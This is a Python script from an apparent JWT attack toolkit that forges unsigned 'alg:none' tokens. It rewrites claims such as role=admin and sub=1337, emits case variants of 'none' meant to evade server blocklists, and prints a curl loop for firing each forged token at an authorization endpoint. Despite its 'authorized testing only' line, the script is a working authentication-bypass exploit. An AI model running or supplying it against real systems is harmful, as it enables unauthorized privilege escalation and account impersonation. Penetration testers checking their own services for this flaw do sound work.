#!/usr/bin/env python3
"""
alg_none.py — forge an unsigned (alg:none) token (guide §6).
Emits one token per case variant (none/None/NONE/nOnE) so you can test which slips the
server's blocklist. Empty signature segment.

AUTHORIZED TESTING ONLY. Forge into your own test account; never impersonate a real user.

Example:
  python3 alg_none.py <TOKEN> --claim role=admin --claim sub=1337
"""
import argparse
from jwt_common import decode_token, build_token, apply_claims

VARIANTS = ["none", "None", "NONE", "nOnE", "nonE", "NonE"]


def main():
    ap = argparse.ArgumentParser(description="Forge alg:none tokens (all case variants).")
    ap.add_argument("token")
    ap.add_argument("--claim", action="append", default=[], help="key=value (repeatable)")
    ap.add_argument("--only", help="emit only this alg variant (e.g. none)")
    args = ap.parse_args()

    header, payload, _ = decode_token(args.token)
    payload = apply_claims(payload, args.claim)

    variants = [args.only] if args.only else VARIANTS
    for alg in variants:
        h = dict(header)
        h["alg"] = alg
        token = build_token(h, payload, alg=alg)
        print(f"--- alg={alg!r} ---")
        print(token)
        print()

    print("[i] Try each against an authz endpoint:")
    print('    for t in <tokens>; do curl -s -o /dev/null -w "%{http_code}\\n" "$URL" -H "Authorization: Bearer $t"; done')


if __name__ == "__main__":
    main()
